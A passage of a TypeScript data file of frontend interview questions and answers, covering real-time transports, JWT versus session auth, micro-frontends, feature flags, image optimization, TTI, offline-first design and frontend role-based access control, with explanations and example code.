          code: `// ❌ Broken — not focusable, no keyboard, not announced
<div onClick={save}>Save</div>

// ✅ Right
<button type="button" onClick={save}>Save</button>`,
        },
        {
          language: "tsx",
          caption: "Live region for async status",
          code: `<div role="status" aria-live="polite">
  {isSaving ? "Saving..." : saved ? "Saved" : null}
</div>`,
        },
      ],
      followUps: [
        "What are the WCAG conformance levels (A, AA, AAA)?",
        "How do you correctly trap focus inside a modal?",
        "How do you announce a route change to a screen reader in an SPA?",
      ],
      commonMistakes: [
        "Using `<div role='button'>` without keyboard handlers.",
        "Hiding focus styles globally with `outline: none`.",
        "Putting text inside `<img alt>` that duplicates surrounding text.",
      ],
      performanceConsiderations: [
        "Accessibility has near-zero perf cost. Focus management and live regions are cheap.",
      ],
      edgeCases: [
        "Toast announcements: too many `aria-live` updates flood screen readers; throttle.",
        "Skip-link to main content is essential for keyboard users on long pages.",
      ],
      realWorldExamples: [
        "GOV.UK Design System and Adobe Spectrum publish accessible components with full keyboard + screen-reader behavior — copy patterns, don't reinvent.",
      ],
      seniorDiscussion:
        "Senior signal: discuss accessibility as a first-class engineering concern (a11y in CI, design-system primitives like Radix UI/HeadlessUI), focus management strategies, internationalization (RTL, lang), and the legal/business case (ADA, EAA).",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 15,
    },
  },

  {
    title: "WebSockets vs Server-Sent Events vs polling",
    aliases: ["websocket vs sse", "websockets vs sse polling", "real-time updates"],
    question: {
      id: "websockets-vs-sse-vs-polling",
      slug: "websockets-vs-sse-vs-polling",
      title: "WebSockets vs Server-Sent Events vs polling — which transport when?",
      category: "networking",
      subcategory: "Real-time",
      tags: ["websockets", "sse", "polling", "real-time", "networking"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Polling is simplest (HTTP). SSE is one-way server→client (text, auto-reconnect, HTTP/2-friendly). WebSockets are bidirectional, binary-capable, lowest-latency. Pick the *least* powerful that fits — operational cost rises with each.",
      answer: `Three transports for "the server has new data":

**Polling** — client sends \`GET /events\` every N seconds. Pros: trivial, works through every proxy, idempotent. Cons: latency (worst case = N seconds), wasted requests, hard to scale below ~5s.

**Long polling** — server holds the request open until data arrives, then returns. Latency is near-instant. Cons: complex to operate at scale, proxy timeouts, one connection per client.

**Server-Sent Events (SSE)** — server streams text events over an HTTP response. Pros: native EventSource API, automatic reconnect with \`Last-Event-ID\`, plays nicely with HTTP/2 multiplexing, simple to debug. Cons: one-way (server → client only), text only, no IE.

**WebSockets** — full-duplex, binary-capable. Pros: lowest latency in both directions, low overhead per message. Cons: requires upgrade negotiation, separate scaling/load-balancing concerns, more error states (connection drops, message ordering on reconnect), often need a separate sticky-session infra.

Decision flow:
- Need to send messages **to** the server in real time? → WebSocket.
- One-way push from server is enough? → SSE.
- Updates are infrequent (≥30s) or you can't operate stateful infra? → Polling.

Modern alternatives often used: WebTransport (HTTP/3), GraphQL subscriptions over WebSocket, libraries like Pusher/Ably/Liveblocks that abstract the transport.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "SSE on the client",
          code: `const es = new EventSource("/api/feed");
es.onmessage = (e) => console.log("event:", e.data);
es.onerror = () => {/* EventSource auto-retries */ };
// Server emits: \`data: {"id":42}\\n\\n\``,
        },
        {
          language: "ts",
          caption: "WebSocket — bidirectional",
          code: `const ws = new WebSocket("wss://api.example.com/live");
ws.onopen    = () => ws.send(JSON.stringify({ subscribe: "orders" }));
ws.onmessage = (e) => apply(JSON.parse(e.data));
ws.onclose   = (e) => reconnectWithBackoff(e.code);`,
        },
      ],
      followUps: [
        "How do you scale WebSockets across multiple servers?",
        "When does HTTP/2 multiplexing remove SSE's connection-limit problem?",
        "How do you handle ordering and dedupe across reconnects?",
      ],
      commonMistakes: [
        "Defaulting to WebSockets for read-only updates that SSE handles cheaper.",
        "Not handling reconnect / backoff — temporary network blips kill the stream forever.",
        "Forgetting to authenticate the upgrade — an unauthenticated WS endpoint is a foot-gun.",
      ],
      performanceConsiderations: [
        "Connection counts: polling = N clients × 1 short request per cycle. WebSocket = N persistent connections — server memory and load-balancer config matter.",
      ],
      edgeCases: [
        "Corporate proxies sometimes break WebSocket upgrades but allow SSE.",
        "Browsers cap concurrent SSE connections per origin (~6 over HTTP/1) — HTTP/2 fixes this.",
      ],
      realWorldExamples: [
        "Stripe Dashboard uses SSE for activity feeds; Figma and Linear use WebSockets for collaborative editing.",
      ],
      seniorDiscussion:
        "Senior signal: discuss state synchronization (operational transforms, CRDTs), backpressure, sticky sessions vs Redis pub/sub, and graceful degradation to polling.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 18,
    },
  },

  {
    title: "JWT vs session cookies for auth",
    aliases: ["jwt vs sessions", "jwt vs session cookies", "auth jwt sessions"],
    question: {
      id: "jwt-vs-session-cookies",
      slug: "jwt-vs-session-cookies",
      title: "JWT vs session cookies — which one for your auth?",
      category: "security",
      subcategory: "Authentication",
      tags: ["jwt", "sessions", "auth", "cookies", "security"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Session cookies (server-side state, opaque ID in HttpOnly cookie) are simpler, easy to revoke, secure by default. JWTs are stateless, easier to use across services — but harder to revoke and easier to misuse. For most monoliths: sessions. For multi-service / mobile / SSO: JWT.",
      answer: `**Session cookies**
- Server stores session state (user id, expiry, csrf token) in Redis/DB keyed by an opaque session id.
- Client holds an HttpOnly + Secure + SameSite cookie containing only the id.
- **Revocation**: delete the row. Instant.
- **Trust**: server is the only source of truth.

**JWT (signed token)**
- Server signs a token containing claims (sub, exp, role…).
- Client stores it (cookie, localStorage, memory).
- **Stateless**: any service that has the public key can verify without DB lookup.
- **Revocation**: hard. The token is valid until \`exp\`. Workarounds: short TTL + refresh token, denylist (which adds back the state JWT was supposed to remove), per-user version claim.

When sessions are right:
- Single application or trust boundary.
- You need quick revocation (logout-everywhere, password change).
- Default unless you have a specific reason.

When JWT is right:
- Service-to-service or microservices fan-out where the verifier doesn't share a DB.
- Mobile apps, third-party API integrations.
- SSO / OAuth flows (the access token is a JWT in many providers).

**Storage matters.** Whether session id or JWT, prefer **HttpOnly + Secure + SameSite=Lax/Strict** cookies. \`localStorage\` is XSS-readable; never store auth tokens there.

Common pattern: session for first-party web app, JWT for issued API tokens, refresh-token rotation in either model.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Setting an HttpOnly session cookie (Next.js route handler)",
          code: `import { cookies } from "next/headers";

export async function POST(req: Request) {
  const sessionId = await createSession(/* user */);
  cookies().set("sid", sessionId, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    path: "/",
    maxAge: 60 * 60 * 24 * 7, // 7d
  });
  return new Response(null, { status: 204 });
}`,
        },
      ],
      followUps: [
        "How do you revoke a JWT before it expires?",
        "What's the role of refresh tokens, and how do you rotate them?",
        "When is JWT in localStorage acceptable?",
      ],
      commonMistakes: [
        "Storing a JWT in localStorage and getting XSS'd.",
        "Treating JWT as an unforgeable secret — it's *signed*, not *encrypted*. Anyone can read its payload.",
        "Using long-lived JWTs without a revocation strategy.",
      ],
      performanceConsiderations: [
        "JWT verify is ~µs (HMAC) to ~ms (RSA). Session lookup is one Redis hop. Both are negligible if your stack is right.",
      ],
      edgeCases: [
        "Clock skew — set leeway on `exp` validation.",
        "Cookie size limits (~4KB) — large JWTs in cookies can break HTTP headers.",
      ],
      realWorldExamples: [
        "Most SaaS dashboards use sessions (Linear, Notion). OAuth providers (Google, Auth0) issue JWT access tokens for API calls.",
      ],
      seniorDiscussion:
        "Senior signal: discuss refresh-token rotation, sliding sessions, replay protection, and the security tradeoffs between same-domain cookies and Authorization headers.",
      relatedSlugs: ["why-are-httponly-cookies-preferred-for-auth"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 15,
    },
  },

  {
    title: "Micro-frontends with independent deploys",
    aliases: ["micro frontends independent deploys", "micro-frontends architecture"],
    question: {
      id: "micro-frontends-independent-deploys",
      slug: "micro-frontends-independent-deploys",
      title: "How do you design a micro-frontend with independent deploys?",
      category: "system-design",
      subcategory: "Architecture",
      tags: ["micro-frontends", "architecture", "monorepo", "module-federation"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Pick an integration model (build-time, run-time, or iframe). Define hard contracts: shared design tokens, a routing shell, versioned module-federation remotes, and a single auth/session source. Independent deploy means independent CI, independent versioned contract, and runtime-loadable bundles.",
      answer: `Micro-frontends solve an organizational problem (multiple teams, independent deploy cadence) at the cost of significant tech complexity. Don't adopt them for technical novelty alone.

**Three integration models:**

1. **Build-time composition** — each MFE publishes a package; the shell installs them. Independent dev, but shipping requires a shell rebuild. Smallest jump from a monorepo.
2. **Runtime composition (Module Federation)** — Webpack/Vite Module Federation lets the shell load a remote bundle at runtime via an URL. Each team deploys its remote independently; the shell discovers the new version on next page load. The most popular middle path in 2024+.
3. **Iframes** — strongest isolation, hardest UX (focus, routing, sharing context). Use when the MFE is genuinely owned by another company or has a different tech stack.

**Hard requirements either way:**
- **Shared design system** (tokens, components) versioned independently and consumed by all MFEs.
- **Single auth/session source** — a host-provided identity context the MFEs read from.
- **Routing shell** — owns top-level routes; delegates sub-routes to MFEs.
- **Contract testing** — Pact-style contracts so the shell knows what each MFE promises.
- **Performance budget per MFE** — without this, one team's 1MB bundle slows everyone.
- **Observability** — distributed errors, perf attribution per MFE.

**When NOT to do MFE:**
- < 3–4 teams.
- Single deploy cadence is fine.
- You can solve the org problem with a monorepo + clear ownership instead.

The pragmatic stack for 2024+: monorepo (pnpm workspaces or turbo), Module Federation for runtime composition, shared design system as an internal package, identity in the shell, route-based code splitting per team's pages.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Module Federation host (sketch)",
          code: `// host/webpack.config.js
new ModuleFederationPlugin({
  name: "shell",
  remotes: {
    checkout: "checkout@https://cdn.example.com/checkout/remoteEntry.js",
    catalog:  "catalog@https://cdn.example.com/catalog/remoteEntry.js",
  },
  shared: { react: { singleton: true }, "react-dom": { singleton: true } },
});

// host code
const Checkout = React.lazy(() => import("checkout/CheckoutPage"));`,
        },
      ],
      followUps: [
        "How do you handle shared dependencies (React) without duplicating across remotes?",
        "How do you safely roll back a single MFE without affecting others?",
        "How do you keep design consistency across independent teams?",
      ],
      commonMistakes: [
        "Adopting MFE for two teams — the overhead exceeds the win.",
        "Shipping multiple copies of React because singletons aren't configured.",
        "No shared design system — UI drifts within months.",
      ],
      performanceConsiderations: [
        "Each remote is a separate network round trip. Preload critical remotes; lazy-load the rest.",
      ],
      edgeCases: [
        "Auth refresh — only the shell should refresh tokens; remotes read the result.",
        "CSS bleed across MFEs without scoping (Shadow DOM, CSS Modules, or scoped class prefixes).",
      ],
      realWorldExamples: [
        "Spotify, IKEA, Amex publicly describe MFE architectures. Module Federation is the most common runtime model in 2024+.",
      ],
      seniorDiscussion:
        "Senior signal: discuss versioning + contract evolution, runtime vs build-time tradeoffs, performance attribution, and the org/Conway's-law dimension that motivates MFE in the first place.",
      relatedSlugs: ["explain-frontend-architecture-patterns-when-to-split-into-smaller-independent-modules"],
      companyTags: [],
      estimatedReadingMinutes: 9,
      estimatedSolvingMinutes: 25,
    },
  },

  {
    title: "Designing a frontend feature flag system",
    aliases: ["feature flag system", "feature flags architecture", "feature toggles"],
    question: {
      id: "designing-frontend-feature-flag-system",
      slug: "designing-frontend-feature-flag-system",
      title: "How would you design a frontend feature flag system?",
      category: "system-design",
      subcategory: "Architecture",
      tags: ["feature-flags", "experiments", "rollouts", "architecture"],
      difficulty: "medium",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Server-evaluated flags injected into the page (or via SDK) keyed on user/segment, cached at edge, with a kill switch. Avoid client-only flags for rollout (CLS, leaks) and avoid evaluating in components — central context plus typed API.",
      answer: `Goals of a feature-flag system:

1. **Trunk-based dev** — ship code dark, enable later.
2. **Gradual rollout** — 1% → 50% → 100% with health-metric gating.
3. **Kill switch** — turn off a bad feature without a redeploy.
4. **Targeting** — by user, plan, geography, A/B bucket.
5. **Experiments** — measure flag → metric impact.

**Architecture for the frontend:**

- **Source of truth** — a flag service (LaunchDarkly, GrowthBook, Unleash, or homegrown). UI for PMs/devs to toggle.
- **Evaluation point** — server-side at request time. The HTML/RSC payload is rendered with flags already resolved. **Don't** evaluate in the client component for first paint — it causes flicker (flag reads default, then flips after JS loads).
- **SDK in the client** — for in-session flag changes (rare) and for SPA navigations after the initial render.
- **Caching** — CDN-cached flag bundle keyed on user/segment hash. Stale-while-revalidate keeps it fast; invalidate on toggle.
- **Typed flags** — generate TS types from the flag list so misspellings break the build.
- **Default values everywhere** — code must work when the flag service is unreachable.
- **Telemetry** — log every evaluation with the resolved value so experiments can attribute outcomes.

**Antipatterns:**
- Hundreds of stale flags. Add a TTL/owner/cleanup process.
- Flag-check inside hot render loops.
- Conditional hooks based on a flag — breaks the rules of hooks.

Feature flags become the company's most-used dependency once adopted; treat the system as production infra with SLOs.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Server-evaluated flags injected into context",
          code: `// app/layout.tsx (RSC)
import { evaluateFlags } from "@/lib/flags";
import { FlagsProvider } from "@/lib/flags/provider";

export default async function Root({ children }) {
  const user = await getUser();
  const flags = await evaluateFlags(user); // server, cached
  return (
    <html>
      <body>
        <FlagsProvider value={flags}>{children}</FlagsProvider>
      </body>
    </html>
  );
}

// in a client component
const flags = useFlags();
if (flags.newCheckout) return <NewCheckout />;`,
        },
      ],
      followUps: [
        "How do you avoid flag-evaluation flicker on first paint?",
        "How do you measure the impact of a flag change?",
        "How do you keep the flag count from growing unbounded?",
      ],
      commonMistakes: [
        "Client-only flag evaluation — flicker, SEO inconsistency, edge-cache mess.",
        "Hard-coding flag names as strings everywhere.",
        "Flag-checks inside render hot paths without memoization.",
      ],
      performanceConsiderations: [
        "Edge-cached flag bundles per segment. Avoid one network call per page load.",
      ],
      edgeCases: [
        "User logs in mid-session — flags re-evaluate; UI must handle a flag flipping live.",
        "Bot traffic — pin them to a stable bucket so analytics aren't polluted.",
      ],
      realWorldExamples: [
        "Most modern SaaS uses LaunchDarkly or GrowthBook; Vercel/Next ships its own flags SDK with edge evaluation.",
      ],
      seniorDiscussion:
        "Senior signal: discuss flag lifecycle (own/expire), experiment design (significance, guardrail metrics), and the interplay with config-as-code rollout pipelines.",
      relatedSlugs: ["how-would-you-implement-feature-flags-safely"],
      companyTags: [],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 20,
    },
  },

  {
    title: "Image optimization techniques on the frontend",
    aliases: ["image optimization", "next image", "image performance"],
    question: {
      id: "image-optimization-techniques",
      slug: "image-optimization-techniques",
      title: "Image optimization techniques on the frontend",
      category: "performance",
      subcategory: "Assets",
      tags: ["images", "performance", "lcp", "next-image", "lazy-loading"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Serve modern formats (AVIF/WebP), correct sizes via srcset, lazy-load below-the-fold, eager + fetchpriority='high' for the LCP image, reserve dimensions to prevent CLS, and use a CDN with on-the-fly resizing.",
      answer: `Images are usually the largest assets on a page and the LCP element on most marketing pages. The optimization checklist:

1. **Format.** AVIF (best compression) → WebP fallback → JPEG/PNG legacy. Most CDNs negotiate via \`Accept\` header.
2. **Right size.** Use \`srcset\` + \`sizes\` so phones download a 400px version, not the 2400px hero. Skipping this is the #1 source of mobile data waste.
3. **Reserve space.** Always set \`width\` + \`height\` (or aspect-ratio CSS) to prevent CLS when the image loads.
4. **Lazy-load below-the-fold.** \`loading="lazy"\`. **Don't** lazy-load the LCP image — pair eager + \`fetchpriority="high"\` for it.
5. **Preconnect / preload** the LCP image origin.
6. **Compression.** mozjpeg (lossy), oxipng/zopfli (lossless). Strip metadata.
7. **Responsive sources.** \`<picture>\` with multiple \`<source>\` for art direction (hero on mobile vs desktop).
8. **CDN with on-the-fly resizing.** Cloudflare Images, Vercel Image Optimization, Cloudinary. Source asset stays single-canonical; CDN serves variants.
9. **Decoding hint.** \`decoding="async"\` for non-critical images so decode doesn't block paint.
10. **Inline tiny placeholders.** A blurred 20-byte LQIP keeps perceived perf high.

Frameworks usually wrap the boilerplate: Next.js \`<Image>\` does srcset, format negotiation, lazy loading, and preconnect for free. Use it.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "LCP-friendly hero image",
          code: `<img
  src="/hero.webp"
  width={1600}
  height={900}
  fetchpriority="high"
  loading="eager"
  decoding="async"
  alt="Frontend Prep dashboard"
/>`,
        },
        {
          language: "tsx",
          caption: "Responsive sizes with srcset",
          code: `<img
  src="/img-1200.jpg"
  srcSet="/img-400.jpg 400w, /img-800.jpg 800w, /img-1600.jpg 1600w"
  sizes="(max-width: 600px) 100vw, 800px"
  width={1600}
  height={900}
  alt="..."
/>`,
        },
      ],
      followUps: [
        "How does Next/Image handle format negotiation?",
        "What's the difference between `loading='lazy'` and IntersectionObserver lazy?",
        "Why does art direction need <picture> + <source> instead of srcset alone?",
      ],
      commonMistakes: [
        "Lazy-loading the LCP image and adding 200ms+ to LCP.",
        "Skipping width/height and causing CLS on every image load.",
        "Serving the same image to mobile and 4K monitors.",
      ],
      performanceConsiderations: [
        "AVIF saves ~30% over WebP, ~50% over JPEG at the same quality — biggest single win.",
        "Sprite/SVG-icon strategy beats many small images for icons.",
      ],
      edgeCases: [
        "Animated content: GIF is huge; convert to MP4/WebM with `<video autoplay muted playsinline>` for ~10× smaller files.",
        "Very tall images cause layout shift after lazy load if you don't set aspect ratio.",
      ],
      realWorldExamples: [
        "Next.js Image, Astro Image, and Cloudinary's auto-format pipeline are de-facto standards in production stacks.",
      ],
      seniorDiscussion:
        "Senior signal: discuss the asset pipeline (build-time vs CDN), priority hints, content-aware compression, and how images interact with Core Web Vitals across pages.",
      relatedSlugs: ["how-do-you-optimize-core-web-vitals", "web-vitals-what-matters"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Time to Interactive (TTI) — what slows it down and how to fix it",
    aliases: ["reduce tti", "time to interactive", "tti optimization"],
    question: {
      id: "reduce-time-to-interactive",
      slug: "reduce-time-to-interactive",
      title: "How do you reduce Time to Interactive (TTI)?",
      category: "performance",
      subcategory: "Web Vitals",
      tags: ["tti", "hydration", "performance", "javascript", "long-tasks"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "TTI is the moment the page is reliably responsive. The killer is JS — download, parse, execute, hydrate. Reduce by shipping less JS (RSC, code splitting, tree shaking), avoiding long tasks, deferring non-critical work, and hydrating selectively.",
      answer: `TTI is the time from navigation start until the page is **reliably responsive** to input — usually defined as no long task in the next 5 seconds plus all critical scripts loaded.

What makes TTI slow:

1. **Big JS bundles** — download time on slow networks dominates.
2. **Long tasks** — any task > 50ms blocks input. Hydration is the most common culprit.
3. **Render-blocking resources** — synchronous scripts, non-critical CSS in the head.
4. **Third-party scripts** — analytics, chat, ads run on the main thread and steal CPU.

**The fix list:**

- **Ship less JS.** Tree shaking, dead-code elimination, RSC (server-only code stays on server), heavy libs (charts, editors) lazy-loaded.
- **Code-split by route.** Each route loads its own chunk, not the whole app.
- **Defer non-critical scripts.** \`defer\` / \`async\` / \`requestIdleCallback\` / \`scheduler.postTask\`. Move analytics off the critical path.
- **Reduce hydration cost.** Selective hydration (Astro islands, RSC, partial hydration). Only hydrate interactive components.
- **Break long tasks.** \`yieldToMain\` patterns inside long loops.
- **Preconnect / preload** critical origins early.
- **Move third-party off main thread.** Partytown for analytics, web workers for CPU.

Measure: Lighthouse for lab data, \`web-vitals\` library for field. The new metric to watch alongside TTI is **INP** (Interaction to Next Paint) — captures the worst real-user interaction, not just initial load.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "yieldToMain — break a long synchronous task",
          code: `function yieldToMain() {
  return new Promise<void>((r) => setTimeout(r, 0));
}

async function processBatch(items: Item[]) {
  for (let i = 0; i < items.length; i++) {
    process(items[i]);
    if (i % 100 === 0) await yieldToMain();
  }
}`,
        },
      ],
      followUps: [
        "Why does hydration cost so much, and how does selective hydration help?",
        "How does the React Compiler change the JS-payload story?",
        "What's the cheapest third-party-script optimization?",
      ],
      commonMistakes: [
        "Shipping a 500KB main bundle and trying to fix TTI without code-splitting.",
        "Lazy-loading critical components so the LCP element waits on a chunk.",
        "Letting third-party scripts run synchronously in the head.",
      ],
      performanceConsiderations: [
        "Server-render the LCP element as plain HTML, hydrate later. The user sees the page much sooner.",
      ],
      edgeCases: [
        "Single-page app navigations don't have a 'fresh TTI' — measure long tasks per route change.",
        "Slow CPU emulation in DevTools reveals issues that don't show on dev hardware.",
      ],
      realWorldExamples: [
        "Astro's 'islands' architecture and Next.js RSCs were both motivated by hydration-cost-driven TTI.",
      ],
      seniorDiscussion:
        "Senior signal: discuss perf budgets in CI, RUM-driven optimization, RSC streaming, and how INP supplements/supersedes TTI in the modern toolkit.",
      relatedSlugs: ["web-vitals-what-matters", "how-do-you-reduce-bundle-size-in-production"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 15,
    },
  },

  {
    title: "Designing an offline-first frontend",
    aliases: ["offline first app", "pwa offline", "offline functionality"],
    question: {
      id: "designing-offline-first-frontend",
      slug: "designing-offline-first-frontend",
      title: "How do you design an offline-first frontend?",
      category: "system-design",
      subcategory: "Offline & PWA",
      tags: ["pwa", "offline", "service-worker", "indexeddb", "sync"],
      difficulty: "hard",
      frequency: "medium",
      seniority: "senior",
      shortDescription:
        "Treat the network as optional, the local store as canonical. Service worker caches the shell + assets, IndexedDB stores data, mutations queue with idempotency keys, sync reconciles on reconnect. CRDTs or last-write-wins for conflicts.",
      answer: `Offline-first means the UI works whether or not the network is up. That requires reframing the data model: the **local store is the source of truth** for the user's session, and the server is the source of truth for the canonical world.

**Layers to design:**

1. **App shell + assets** — Service Worker caches HTML/CSS/JS so the page loads offline. Pattern: cache-first for assets, network-first with cache fallback for HTML.
2. **Data store** — IndexedDB (Dexie or RxDB make it pleasant) holds entities. The UI reads from local; the network layer syncs in the background.
3. **Mutation queue** — every write goes to the local store immediately and is enqueued for the server. Each mutation has a stable client-generated id (idempotency key) so retries are safe.
4. **Sync engine** — on reconnect, drain the queue. Handle 4xx (rejections, e.g. validation) and 5xx (retry). Reconcile server-returned IDs with local temp IDs.
5. **Conflict resolution** — pick a strategy:
   - **Last-write-wins** — simplest. OK for personal apps.
   - **Per-field merge** — e.g. JSON Patch.
   - **CRDTs** (Automerge, Yjs) — for collaborative editing where two users edit the same doc offline.
6. **Status surfacing** — show "saved locally", "syncing", "synced", "offline". Users tolerate problems they can see.
7. **Storage limits** — browsers cap IndexedDB. Use \`navigator.storage.persist()\` for critical data, plan eviction.

**Antipatterns:**
- Optimistic-only UI without queue persistence — closing the tab loses writes.
- Treating offline as an error case instead of a normal state.
- Ignoring quota / eviction on long-lived offline apps.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Mutation queue (sketch with idempotency key)",
          code: `type Pending = { id: string; op: string; payload: unknown; tries: number };

async function enqueue(op: string, payload: unknown) {
  await idb.add("pending", {
    id: crypto.randomUUID(),
    op, payload, tries: 0,
  });
  drain();
}

async function drain() {
  if (!navigator.onLine) return;
  for await (const m of idb.iterate("pending")) {
    try {
      await api.send(m.op, m.payload, { idempotencyKey: m.id });
      await idb.delete("pending", m.id);
    } catch (e) {
      if (isClient4xx(e)) await idb.move("pending", m.id, "failed");
      else m.tries++;  // backoff
    }
  }
}

window.addEventListener("online", drain);`,
        },
      ],
      followUps: [
        "How would you handle offline conflicts in a collaborative editor?",
        "When would you reach for a CRDT vs operational transform?",
        "How do you handle auth-token expiry while the app is offline?",
      ],
      commonMistakes: [
        "Storing the queue in memory — lost on reload.",
        "Using server-generated IDs as primary keys before sync — rewrite hell.",
        "Ignoring quota and getting QuotaExceededError on tablets.",
      ],
      performanceConsiderations: [
        "IndexedDB writes are async; batch where possible. Keep working set in memory for hot reads.",
      ],
      edgeCases: [
        "Auth refresh while offline — fall back to a long-lived offline token or graceful re-auth on reconnect.",
        "User on multiple devices — sync must handle merges across devices, not just online/offline.",
      ],
      realWorldExamples: [
        "Linear, Notion, Figma all run offline-first with sophisticated sync engines (Linear is a great public example).",
      ],
      seniorDiscussion:
        "Senior signal: discuss CRDTs vs OT, sync protocols (delta vs full), persistence guarantees, and how to test offline behavior in CI.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 9,
      estimatedSolvingMinutes: 30,
    },
  },

  {
    title: "Role-Based Access Control on the frontend",
    aliases: ["rbac frontend", "role based access control"],
    question: {
      id: "role-based-access-control-frontend",
      slug: "role-based-access-control-frontend",
      title: "How do you implement Role-Based Access Control on the frontend?",
      category: "security",
      subcategory: "Authorization",
      tags: ["rbac", "auth", "authorization", "security"],
      difficulty: "medium",
      frequency: "medium",
      seniority: "senior",
      shortDescription:
        "Frontend RBAC is UX, not security. Hide unauthorized UI but treat the server as the only authority. Encode permissions as capabilities (`can('edit:post', resource)`), not raw role names, so policies can evolve.",
      answer: `**The first principle.** *Frontend authorization is not security.* Anyone with DevTools can flip a "isAdmin" boolean. Every authorization decision must be re-checked on the server. Frontend RBAC is purely about *not showing actions a user can't perform* — UX.

With that out of the way, the design:

**1. Encode capabilities, not roles.**
\`can('post:edit', { resource })\` survives policy evolution; \`role === 'admin'\` doesn't. Roles map *to* capabilities; check capabilities everywhere.

**2. Centralize policy.**
A single \`Permissions\` provider holds the user's resolved capabilities. Components ask via a hook (\`useCan('post:edit', post)\`).

**3. Two flavors of guard.**
- **Hide / disable UI** for actions the user can't take.
- **Route guard** for entire pages — redirect or show a "no access" screen.
- Both call the same \`can()\` function.

**4. Resource-aware permissions.**
\`can('post:edit', post)\` may depend on ownership, not just role. Encode that in the policy function.

**5. Sync with the server.**
Capabilities should come from the same source the server uses. Best: server returns the capability set on login. Worst: client computes from a role string and drifts from the server.

**6. Audit trail and missing-permission UX.**
When the server says 403, surface a useful message — "You don't have permission to do X. Contact your admin." — not a generic error.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Capability hook + guarded UI",
          code: `type Capability = "post:edit" | "post:delete" | "billing:manage";

function useCan(cap: Capability, resource?: { ownerId?: string }) {
  const me = useUser();
  if (cap === "post:edit") return me.role === "admin" || resource?.ownerId === me.id;
  if (cap === "billing:manage") return me.role === "admin";
  return false;
}

function PostMenu({ post }: { post: Post }) {
  const canEdit = useCan("post:edit", post);
  return (
    <Menu>
      {canEdit && <MenuItem onClick={edit}>Edit</MenuItem>}
      <MenuItem onClick={open}>Open</MenuItem>
    </Menu>
  );
}`,
        },
      ],
      followUps: [
        "How do you keep frontend permissions in sync with backend policy?",
        "What's the difference between RBAC and ABAC?",
        "How do you handle multi-tenant permissions (org-scoped roles)?",
      ],
      commonMistakes: [
        "Treating frontend checks as security — they aren't.",
        "Hard-coding role strings in components instead of capability checks.",
        "Forgetting to refresh capabilities when the user's role changes mid-session.",
      ],
      performanceConsiderations: [
        "Resolve all capabilities once on login; avoid round trips per render.",
      ],
      edgeCases: [
        "Optimistic UI shows a button briefly before capabilities load — gate on a `ready` flag or render a skeleton.",
        "Role change in a long-lived session — push via WebSocket or re-evaluate on focus.",
      ],
      realWorldExamples: [
        "Notion's permission model (workspace, page, block) is essentially capability-based; same for GitHub teams/repos.",
      ],
      seniorDiscussion:
        "Senior signal: discuss policy engines (OPA/Cedar), ABAC vs RBAC tradeoffs, multi-tenant authorization, and the boundary between feature flags and permissions.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 20,
    },
  },

  {
    title: "Memoization pitfalls in React",
    aliases: ["memoization pitfalls", "react memo pitfalls"],
    question: {
      id: "memoization-pitfalls-react",
      slug: "memoization-pitfalls-react",
      title: "Memoization pitfalls in React — when does memo / useMemo / useCallback hurt?",
      category: "react",
      subcategory: "Performance",
      tags: ["memoization", "react.memo", "usememo", "usecallback", "performance"],
      difficulty: "medium",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Memoization adds bookkeeping cost for every render. It only pays off when the work is expensive AND the deps are actually stable AND a downstream consumer cares about identity. Most of the time it makes code noisier without measurable wins.",
      answer: `\`React.memo\`, \`useMemo\`, \`useCallback\` aren't free. Each adds:

- A dependency-array comparison every render.
- An extra allocation for the cache slot.
- Cognitive overhead for readers.

When memoization actually helps (all must be true):

1. **Expensive work** — a real computation, not a string concat. Profile first.
2. **Stable deps** — the inputs don't change every render. If they do, memo just adds bookkeeping for nothing.
3. **A consumer that cares about reference equality** — e.g., \`React.memo\` child, \`useEffect\` dependency.

Common misuses:

- **Wrapping every callback in useCallback** — but the receiving component isn't memoized, so reference stability changes nothing.
- **Memoizing primitives** — \`useMemo(() => count + 1, [count])\` saves nothing.
- **Memoizing inside a parent that re-renders constantly** — deps change every time; memo never hits.
- **Inline objects in deps** — \`useMemo(..., [{ a }])\` recreates the dep object every render; memo never hits.

When memoization can be **net negative**:

- Tight loops where the comparison cost > the saved work.
- High-churn render paths (e.g. animation frames) — allocations from cache slots add up.

**React 19 + React Compiler** auto-memoizes much of this; manual hooks become rarer. Until your codebase compiles, the heuristic is: profile, identify the wasted re-render, then surgically apply memoization to the smallest possible boundary.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "useMemo that does nothing useful",
          code: `// ❌ The work is cheaper than the memo bookkeeping.
const fullName = useMemo(() => \`\${first} \${last}\`, [first, last]);

// ✅ Just compute it.
const fullName = \`\${first} \${last}\`;`,
        },
        {
          language: "tsx",
          caption: "useCallback wasted because child isn't memoized",
          code: `function Parent() {
  const onClick = useCallback(() => save(), []); // stable…
